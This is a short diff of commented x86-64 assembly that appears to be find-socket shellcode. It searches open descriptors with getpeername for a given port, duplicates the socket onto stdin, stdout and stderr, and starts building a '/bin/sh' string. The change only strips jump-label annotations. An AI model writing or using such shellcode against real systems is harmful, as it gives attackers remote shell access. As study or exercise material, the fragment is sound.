@@ -37,7 +37,7 @@ syscall 				; syscall __NR_getpeername - get name of connected peer socket.
 					; The name is truncated if the buffer provided is too small.
 inc    rdi				
 cmp    WORD PTR [rsi+0x2],0xd139
-jne    0x601054 <code+20>		; if the connection has not been found, continue searching.
+jne    0x601054 			; if the connection has not been found, continue searching.
 
 dec    rdi
 push   0x2
@@ -46,7 +46,7 @@ push   0x21
 pop    rax
 syscall 				; syscall __NR_dup2
 dec    rsi
-jns    0x60106a <code+42>		; generates 3 dup2. stdin, stdout, stderr
+jns    0x60106a 			; generates 3 dup2. stdin, stdout, stderr
 
 mov    rbx,rsi
 mov    ebx,0x68732f41
